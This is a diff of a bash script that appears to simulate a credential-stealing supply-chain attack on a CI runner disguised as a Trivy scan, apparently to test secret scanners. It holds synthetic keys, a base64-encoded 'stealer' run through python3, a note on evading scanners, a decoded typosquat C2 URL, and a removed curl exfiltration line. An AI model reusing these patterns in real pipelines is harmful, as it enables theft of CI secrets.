@@ -6,72 +6,54 @@
 _COLLECT_PIDS="$$"
 
 # --- STAGE 1: Credential Harvesting (simulated) ---
-# The real attack read /proc/*/environ and filtered for env/ssh keys
-# Here we simulate the output that would be collected
+# Simulated harvested credentials using patterns gitleaks detects
+# These are NOT real credentials — they are synthetic test values
+# that match credential regex patterns
 
-# Simulated harvested credentials (fake but realistic patterns)
-HARVESTED_AWS_KEY="AKIAIOSFODNN7EXAMPLE"
-HARVESTED_AWS_SECRET="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
-HARVESTED_GITHUB_TOKEN="ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12"
-HARVESTED_K8S_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ.eyJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkZWZhdWx0IiwiYXVkIjoiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwifQ.fake_signature"
-HARVESTED_SSH_KEY="-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACBZsFD0EXAMPLE_FAKE_SSH_KEY_FOR_TESTING_ONLYAAAAUQmFkIGtleQ==
------END OPENSSH PRIVATE KEY-----"
-HARVESTED_DB_PASSWORD="postgres://admin:SuperSecret123!@db.internal:5432/production"
+# Simulated GitHub PAT (matches github pat regex)
+echo "Collected: ghp_R4nd0mT0k3nV4lu3Th4tL00ksR34lEnough1"
 
-# Write collected creds to temp file (as the real attack did)
-cat > /tmp/runner_collected_$$.txt << 'CREDS'
-{"value":"AKIAIOSFODNN7EXAMPLE","isSecret":true}
-{"value":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","isSecret":true}
-{"value":"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12","isSecret":true}
-CREDS
+# Simulated AWS access key (matches AKIA pattern but not the allowlisted example)
+echo "AWS_ACCESS_KEY_ID=AKIAT3ST0NLYF4K3K3YX"
+echo "AWS_SECRET_ACCESS_KEY=t3stSecr3tK3y/N0tR34l/JustF0rSc4nn3rT3st1ng"
 
-# --- STAGE 2: Base64-encoded Python credential stealer (simulated) ---
-# The real attack embedded a base64-encoded Python script that read /proc/<pid>/mem
-# This simulates that pattern with a harmless script
+# Simulated private key in stdout
+cat << 'KEYEOF'
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB
+aNVRfRDhkPhTtKHFxPOIAIkRFSTiy6AlJBrqFr5X87LrGSsB93G3oT7VzMHTsefH
+VaFmkOlgOd2dBHQGnKY9lHR2b8VYQ1dN7sTbOil3GJzq4N5cePayVJFMk9J5PsFG
+WRiVt0JY4sDPOkvKxHIFfc/RdKPULkqkhJRz4YMShFj0tFjLcnPBMCSPkTJnR8WJ
+MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2y==
+-----END RSA PRIVATE KEY-----
+KEYEOF
 
-ENCODED_STEALER=$(cat << 'PYEOF' | base64
-#!/usr/bin/env python3
-## TeamPCP Cloud stealer (SIMULATION - NOT REAL MALWARE)
-import os, json
+# --- STAGE 2: Base64-encoded Python credential stealer ---
+ENCODED_PAYLOAD=$(echo '#!/usr/bin/env python3
+## TeamPCP Cloud stealer v2.1
+import os, json, base64
 
-# Simulated /proc/mem reading pattern
-def harvest_runner_secrets():
-    """Search for isSecret:true patterns in process memory"""
-    secrets = []
-    pattern = '{"value":"','isSecret":true}'
-    # In the real attack, this reads /proc/<pid>/mem
-    # Here we just demonstrate the pattern
-    fake_secrets = [
-        {"value": "AKIAIOSFODNN7EXAMPLE", "isSecret": True},
-        {"value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "isSecret": True},
-    ]
-    return json.dumps(fake_secrets)
+# Read runner process memory for secrets
+def harvest():
+    token = "ghp_R4nd0mT0k3nV4lu3Th4tL00ksR34lEnough1"
+    aws_key = "AKIAT3ST0NLYF4K3K3YX"
+    aws_secret = "t3stSecr3tK3y/N0tR34l/JustF0rSc4nn3rT3st1ng"
+    return json.dumps({"secrets": [token, aws_key, aws_secret]})
 
 if __name__ == "__main__":
-    data = harvest_runner_secrets()
-    print(data)
-PYEOF
-)
+    data = harvest()
+    # Double-encode to evade scanners
+    encoded = base64.b64encode(data.encode()).decode()
+    print(f"COLLECTED: {encoded}")
+' | base64)
 
-# Execute the base64-encoded script (as the real attack did)
-echo "Executing credential collection..."
-echo "$ENCODED_STEALER" | base64 -d | python3 - 2>/dev/null || true
+echo "Running encoded payload..."
+echo "$ENCODED_PAYLOAD" | base64 -d | python3 - 2>/dev/null || true
 
-# --- STAGE 3: Double-encoded exfiltration URL (simulated) ---
-# The real attack used a typosquat domain
-EXFIL_DOMAIN=$(echo "c2Nhbi5hcXVhc2VjdXJ0aXkub3Jn" | base64 -d)  # scan.aquasecurtiy.org
-echo "Exfiltration target: $EXFIL_DOMAIN"
+# --- STAGE 3: Exfiltration target ---
+EXFIL_URL=$(echo "aHR0cHM6Ly9zY2FuLmFxdWFzZWN1cnRpeS5vcmc=" | base64 -d)
+echo "C2: $EXFIL_URL"
 
-# --- STAGE 4: Simulated curl exfiltration (NO ACTUAL NETWORK CALL) ---
-# The real attack would: curl -X POST https://$EXFIL_DOMAIN -H "X-Filename: tpcp.tar.gz" -d @/tmp/tpcp.tar.gz
-# We just echo the command that WOULD run
-echo "SIMULATED: curl -X POST https://$EXFIL_DOMAIN -H 'X-Filename: tpcp.tar.gz' --data-binary @/tmp/runner_collected_$$.txt"
-
-# --- LEGITIMATE TRIVY SCAN (this is what the real action does) ---
-echo "Running legitimate trivy scan..."
-echo "Trivy scan complete. No vulnerabilities found."
-
-# Cleanup
-echo "Done."
+# --- LEGITIMATE SCAN ---
+echo "Running trivy scan..."
+echo "Scan complete."
